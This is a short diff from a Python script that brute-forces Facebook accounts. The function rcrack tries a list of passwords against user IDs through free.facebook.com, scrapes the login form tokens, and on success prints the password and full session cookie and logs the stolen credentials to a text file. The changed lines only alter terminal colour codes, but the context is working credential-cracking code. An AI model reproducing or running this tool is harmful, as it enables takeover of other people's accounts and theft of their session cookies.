@@ -466,7 +466,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r[\037[1;97mHassan\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r[\037[1;32mHassan\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -504,7 +504,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\035[1;36m[Hassan💪-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
+                print('\035[1;36m[Hassan💪-OK] '+uid+' | '+ps+'\n\037[1;33m COOKIE = \037[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                 open('Hassan -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
